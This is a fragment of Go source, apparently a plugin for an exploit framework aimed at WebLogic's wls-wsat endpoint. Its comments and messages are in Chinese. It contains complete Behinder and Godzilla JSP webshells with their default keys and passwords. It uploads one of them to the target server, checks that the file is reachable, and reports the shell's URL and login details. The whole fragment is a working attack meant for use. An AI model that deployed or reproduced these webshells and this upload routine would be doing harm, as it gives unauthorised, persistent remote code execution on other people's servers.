				case <-time.After(time.Second * 20):
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				}
			} else if attackType == "webshell" {
				webshell := ss.Params["webshell"].(string)
				var content string
				filename := goutils.RandomHexString(6) + ".jsp"
				if webshell == "behinder" {
					/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
					content = `<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>`
				} else if webshell == "godzilla" {
					// 哥斯拉 pass key
					content = `<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}%>`
				} else {
					content = ss.Params["content"].(string)
					filename = goutils.B2S(ss.Params["filename"])
				}
				_, err := sendPayloadFlagYCeduL(expResult.HostInfo, fmt.Sprintf("$$$$$$NO$/war/"+filename+":"+base64.StdEncoding.EncodeToString([]byte(content))))
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				resp, err := checkFileFlagYCeduL(expResult.HostInfo, `/wls-wsat/`+filename)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
				} else if resp != nil && (resp.StatusCode == 200 || resp.StatusCode == 500) {
					expResult.Success = true
					expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + `/wls-wsat/` + filename + "\n"
					if webshell == "behinder" {
						expResult.Output += "Password: rebeyond\n"
						expResult.Output += "WebShell tool: Behinder v3.0\n"
					} else if webshell == "godzilla" {
						expResult.Output += "Password: pass 加密器：JAVA_AES_BASE64\n"
						expResult.Output += "WebShell tool: Godzilla v4.1\n"
					}
					expResult.Output += "Webshell type: jsp"
				}
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
